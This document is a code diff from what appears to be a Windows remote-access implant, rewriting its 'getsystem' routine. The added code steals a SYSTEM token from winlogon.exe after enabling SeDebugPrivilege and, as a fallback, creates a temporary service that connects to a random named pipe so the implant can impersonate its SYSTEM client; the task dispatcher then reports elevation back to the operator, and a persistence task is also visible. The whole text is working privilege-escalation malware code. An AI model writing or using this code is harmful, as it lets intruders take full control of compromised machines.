@@ -563,40 +563,112 @@ static char *token_make(const char *user, const char *domain, const char *pass) 
 }
 
 static char *get_system(void) {
-    HANDLE hSelf;
+    /* ── T1: SeDebugPrivilege + token steal from winlogon ───────────────── */
+    HANDLE hSelf = NULL;
     if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hSelf)) {
         enable_privilege(hSelf, "SeDebugPrivilege"); CloseHandle(hSelf);
     }
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return strdup("CreateToolhelp32Snapshot failed");
-    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
-    DWORD sysPid = 0;
-    if (Process32First(snap, &pe)) {
-        do { if (_stricmp(pe.szExeFile, "winlogon.exe") == 0) { sysPid = pe.th32ProcessID; break; } }
-        while (Process32Next(snap, &pe));
+    {
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
+            DWORD sysPid = 0;
+            if (Process32First(snap, &pe)) {
+                do { if (_stricmp(pe.szExeFile, "winlogon.exe") == 0) { sysPid = pe.th32ProcessID; break; } }
+                while (Process32Next(snap, &pe));
+            }
+            CloseHandle(snap);
+            if (sysPid) {
+                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sysPid);
+                if (hProc) {
+                    HANDLE hTok = NULL;
+                    if (OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok)) {
+                        CloseHandle(hProc);
+                        HANDLE hDup = NULL;
+                        if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup)) {
+                            CloseHandle(hTok);
+                            if (ImpersonateLoggedOnUser(hDup)) {
+                                CloseHandle(hDup);
+                                char *out = (char*)malloc(128);
+                                snprintf(out, 128, "[+] T1 SYSTEM (winlogon PID=%lu)", (unsigned long)sysPid);
+                                return out;
+                            }
+                            CloseHandle(hDup);
+                        } else { CloseHandle(hTok); }
+                    } else { CloseHandle(hProc); }
+                }
+            }
+        }
     }
-    CloseHandle(snap);
-    if (!sysPid) return strdup("winlogon.exe not found");
-    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sysPid);
-    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed %lu",GetLastError()); return e; }
-    HANDLE hTok;
-    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok)) {
-        CloseHandle(hProc);
-        char *e=(char*)malloc(64); snprintf(e,64,"OpenProcessToken failed %lu",GetLastError()); return e;
+
+    /* ── T2: Named pipe impersonation via service (overlapped, 15s timeout) */
+    DWORD rnd = GetTickCount() ^ (GetCurrentProcessId() << 4);
+    char pipeName[64]; snprintf(pipeName, sizeof(pipeName), "\\\\.\\pipe\\svc%08lx", (unsigned long)rnd);
+    char svcName[32];  snprintf(svcName,  sizeof(svcName),  "svc%08lx", (unsigned long)(rnd ^ 0xdeadbeefUL));
+    char binPath[256]; snprintf(binPath,  sizeof(binPath),  "cmd.exe /c echo . > %s", pipeName);
+    wchar_t wpipe[64], wsvc[32], wbin[256];
+    MultiByteToWideChar(CP_ACP, 0, pipeName, -1, wpipe, 64);
+    MultiByteToWideChar(CP_ACP, 0, svcName,  -1, wsvc,  32);
+    MultiByteToWideChar(CP_ACP, 0, binPath,  -1, wbin,  256);
+
+    HANDLE hPipe = CreateNamedPipeW(wpipe,
+        0x00000003UL | 0x40000000UL, /* PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED */
+        0x00000000UL,                /* PIPE_TYPE_BYTE | PIPE_WAIT */
+        1, 512, 512, 0, NULL);
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        char *e = (char*)malloc(96);
+        snprintf(e, 96, "[-] T1+T2 failed (CreateNamedPipe err %lu)", GetLastError());
+        return e;
     }
-    CloseHandle(hProc);
-    HANDLE hDup;
-    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup)) {
-        CloseHandle(hTok);
-        char *e=(char*)malloc(64); snprintf(e,64,"DuplicateTokenEx failed %lu",GetLastError()); return e;
+
+    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, 0xF003FUL /* SC_MANAGER_ALL_ACCESS */);
+    if (!hScm) {
+        CloseHandle(hPipe);
+        char *e = (char*)malloc(96);
+        snprintf(e, 96, "[-] T1+T2 failed (OpenSCManager err %lu, need local admin)", GetLastError());
+        return e;
     }
-    CloseHandle(hTok);
-    if (!ImpersonateLoggedOnUser(hDup)) {
-        CloseHandle(hDup);
-        char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed %lu",GetLastError()); return e;
+
+    SC_HANDLE hSvc = CreateServiceW(hScm, wsvc, wsvc, SERVICE_ALL_ACCESS,
+        0x00000010UL, /* SERVICE_WIN32_OWN_PROCESS */
+        0x00000003UL, /* SERVICE_DEMAND_START */
+        0x00000000UL, /* SERVICE_ERROR_IGNORE */
+        wbin, NULL, NULL, NULL, NULL, NULL);
+    if (!hSvc) {
+        CloseServiceHandle(hScm); CloseHandle(hPipe);
+        char *e = (char*)malloc(96);
+        snprintf(e, 96, "[-] T1+T2 failed (CreateService err %lu)", GetLastError());
+        return e;
     }
-    CloseHandle(hDup);
-    char *out=(char*)malloc(128); snprintf(out,128,"[+] SYSTEM token (winlogon PID=%lu)",(unsigned long)sysPid); return out;
+
+    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
+    if (!hEvent) {
+        DeleteService(hSvc); CloseServiceHandle(hSvc); CloseServiceHandle(hScm); CloseHandle(hPipe);
+        return strdup("[-] T1+T2 failed (CreateEvent)");
+    }
+
+    OVERLAPPED ov; memset(&ov, 0, sizeof(ov)); ov.hEvent = hEvent;
+    StartServiceW(hSvc, 0, NULL);
+    ConnectNamedPipe(hPipe, &ov); /* async — returns ERROR_IO_PENDING */
+
+    DWORD wr = WaitForSingleObject(hEvent, 15000);
+    DeleteService(hSvc); CloseServiceHandle(hSvc); CloseServiceHandle(hScm); CloseHandle(hEvent);
+
+    if (wr != WAIT_OBJECT_0) {
+        CancelIoEx(hPipe, &ov); CloseHandle(hPipe);
+        char *e = (char*)malloc(96);
+        snprintf(e, 96, "[-] T1+T2 failed (T2 pipe timeout res=%lu)", wr);
+        return e;
+    }
+
+    BOOL ok2 = ImpersonateNamedPipeClient(hPipe);
+    CloseHandle(hPipe);
+    if (!ok2) {
+        char *e = (char*)malloc(96);
+        snprintf(e, 96, "[-] T1+T2 failed (ImpersonateNamedPipeClient err %lu)", GetLastError());
+        return e;
+    }
+    return strdup("[+] T2 SYSTEM (named pipe + service)");
 }
 
 // ── Token store globals ───────────────────────────────────────────────────────
@@ -1472,7 +1544,8 @@ void dispatch_task(AgentTask *task) {
     }
     else if (strcmp(type_upper, "GETSYSTEM") == 0) {
         char *out = get_system();
-        agent_send_result(task->id, out, ""); free(out);
+        int elevated = out && strncmp(out, "[+]", 3) == 0;
+        agent_send_result_admin(task->id, out ? out : "", "", elevated); free(out);
     }
     else if (strcmp(type_upper, "PERSIST") == 0) {
         char name[128]={0}, cmd2[512]={0}, meth[32]={0};
